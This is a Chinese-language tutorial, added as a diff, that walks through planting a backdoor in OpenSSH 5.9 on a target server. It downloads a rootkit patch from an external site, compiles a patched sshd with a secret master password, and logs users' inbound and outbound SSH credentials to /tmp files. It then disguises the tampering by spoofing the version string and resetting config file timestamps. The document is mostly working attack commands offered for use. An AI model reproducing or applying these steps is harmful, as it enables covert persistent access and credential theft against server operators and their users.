@@ -1,0 +1,49 @@
+此SSH后门目前网上支持版本为5.9以下，因此如果显示信息中的版本为5.9以下才能使用。对高于5.9版本未做测试，理论上是可行的。此SSH后门可以强制修改目标服务器所有用户的SSH连接密码，同时对方无法重新修改SSH连接密码，而本地连接的用户密码不变。
+具体步骤如下：
+1、获取SSH版本信息并记录
+ssh -V
+#OpenSSH_5.3p1, OpenSSL 1.0.1e-fips 11 Feb 2013p1, OpenSSL 1.0.1e-fips 11 Feb 2013
+
+2、下载OpenSSH客户端以及后门程序
+wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz
+wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
+#openssh-5.9p1.tar.gz（正规文件）
+#openssh-5.9p1.path.tar.gz（后门文件）
+
+3、SSH配置文件备份
+mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
+mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
+
+4、安装必备软件
+yum install -y openssl openssl-devel pam-devel zlib zlib-devel
+
+5、解压并patch
+tar zxf openssh-5.9p1.tar.gz
+tar zxf openssh-5.9p1.tar.gz
+cp openssh-5.9p1.patch/sshbd5.9p1.diff  openssh-5.9p1
+cd openssh-5.9p1
+patch < sshbd5.9p1.diff
+
+6、修改文件includes.h 文件记录用户名和密码的文件位置及其密码
+#define ILOG "/tmp/ilog" //记录登录到本机的用户名和密码
+#define OLOG "/tmp/olog" //记录本机登录到远程的用户名和密码
+#define SECRETPW "password" //自行设置后门密码
+
+7、修改version.h文件使其修改后的版本信息为原始版本
+#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"
+#define SSH_PORTABLE "小版本号"
+
+8、安装并编译
+./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
+make clean
+make && make install
+service sshd restart 
+
+9、恢复新配置文件的日期跟旧文件日期一致
+对ssh_config和sshd_config新旧文件进行内容对比，使其配置文件一致，然后在修改文件日期。
+touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config
+touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config
+
+10、测试
+ssh root@ip
+输入刚才设定的后门的密码，如果登录成功，表示设定ok！
